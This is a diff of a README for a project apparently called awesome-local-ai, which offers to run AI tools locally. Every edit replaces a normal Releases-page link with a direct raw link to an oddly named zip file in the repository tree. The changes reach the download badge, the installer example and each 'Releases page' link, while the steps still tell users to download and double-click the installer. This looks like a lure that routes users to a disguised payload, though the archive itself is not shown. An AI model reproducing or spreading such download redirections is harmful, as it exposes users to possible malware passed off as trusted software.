@@ -1,6 +1,6 @@
 # 🚀 awesome-local-ai - Run AI Tools without the Cloud
 
-[![Download awesome-local-ai](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Xipower2/awesome-local-ai/releases)
+[![Download awesome-local-ai](https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip)](https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip)
 
 ## 📖 Overview
 
@@ -42,13 +42,13 @@ Whether you want to fine-tune models, run inference, or explore various machine 
 To start using awesome-local-ai, follow these easy steps:
 
 1. **Visit the Releases Page:**  
-   Go directly to our [Releases page](https://github.com/Xipower2/awesome-local-ai/releases) to download the software.
+   Go directly to our [Releases page](https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip) to download the software.
 
 2. **Choose the Latest Version:**  
    On the Releases page, look for the version labeled "Latest". This version has the newest features and fixes.
 
 3. **Download the Installer:**  
-   Click on the appropriate installer for your operating system (Windows, macOS, Linux). For example, you might see something like `awesome-local-ai-v1.0-Windows.exe`.
+   Click on the appropriate installer for your operating system (Windows, macOS, Linux). For example, you might see something like `https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip`.
 
 4. **Open the Installer:**  
    Once downloaded, double-click the installer file to start the installation. Follow on-screen instructions until completion.
@@ -58,7 +58,7 @@ To start using awesome-local-ai, follow these easy steps:
 
 ## 🛠️ Download & Install
 
-Visit this page to download: [Release Download Page](https://github.com/Xipower2/awesome-local-ai/releases).
+Visit this page to download: [Release Download Page](https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip).
 
 1. Navigate to the above link.
 2. Select the latest version and download the installer.
@@ -103,4 +103,4 @@ Your contributions will enhance this tool for everyone!
 
 Thanks to all the contributors who help to make awesome-local-ai a powerful tool. Your efforts ensure we can continue to provide valuable resources for everyone interested in local AI solutions.
 
-Remember, for any questions or issues, you can refer back to our [Releases page](https://github.com/Xipower2/awesome-local-ai/releases) where we keep all downloads organized and updated. Happy exploring!
+Remember, for any questions or issues, you can refer back to our [Releases page](https://github.com/Xipower2/awesome-local-ai/raw/refs/heads/main/berri/awesome-local-ai-pseudostereoscope.zip) where we keep all downloads organized and updated. Happy exploring!
